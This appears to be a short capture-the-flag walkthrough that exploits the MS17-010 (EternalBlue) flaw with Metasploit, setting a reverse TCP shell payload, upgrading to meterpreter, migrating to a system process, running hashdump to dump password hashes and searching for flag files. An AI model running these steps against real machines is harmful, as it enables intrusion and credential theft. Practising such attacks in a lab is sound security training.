Start metasploit and search for ms17-010(Vulnerable)

Set the required options and set the payload windows/x64/shell/reverse_tcp

Note: Change the default windows/x64/meterpreter/reverse_tcp because this may corrupt the machine and if the exploit failed may require to reboot the machine

Run the exploit after setting the rhosts

Now you must have received the shell

Now we can upgrade the shell to meterpreter

Use post/multi/manage/shell_to_meterpreter

Run the module after setting the shell session as options

you must have received meterpreter shell in backgroud, navigate to the meterpreter shell


You need to migrate the system process

After migrating run hashdump

Inorder to find flag run: search -f flag*

This will give you all the flag location!!!
